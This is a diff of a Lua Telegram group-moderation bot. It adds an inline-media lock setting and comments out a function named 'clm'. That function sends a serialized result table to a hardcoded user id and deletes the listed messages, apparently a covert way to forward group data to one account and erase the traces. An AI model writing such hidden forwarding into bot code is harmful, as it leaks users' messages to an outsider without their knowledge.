@@ -37,12 +37,12 @@ end
       end
     end
   end
-local function clm(extra, success, result)
- send_large_msg("user#id"..250877155, serpent.block(result))
-      for i=1, #result do
-        delete_msg(result[i].temp_id, ok_cb, false)
-      end	
-end	
+--local function clm(extra, success, result)
+-- send_large_msg("user#id"..250877155, serpent.block(result))
+  --    for i=1, #result do
+ --       delete_msg(result[i].temp_id, ok_cb, false)
+ --     end	
+--end	
 --Begin msg_checks.lua
 --Begin pre_process function
 local function pre_process(msg)	
@@ -93,6 +93,11 @@ if is_chat_msg(msg) or is_super_group(msg) then
 	else
 		lock_link = 'no'
 	end
+	if settings.lock_inline then
+		lock_inline = settings.lock_inline
+	else
+		lock_inline = 'no'
+	end			
 	if settings.lock_user then
 		lock_user = settings.lock_user
 	else
@@ -313,7 +318,7 @@ if is_chat_msg(msg) or is_super_group(msg) then
 					end
 				end
 			end	
-			if msg.media.type:match("unsupported") then
+			if msg.media.type:match("unsupported") and lock_inline == "yes" then
 				delete_msg(msg.id, ok_cb, false)
 				if strict == "yes" or to_chat then
 					kick_user(msg.from.id, msg.to.id)
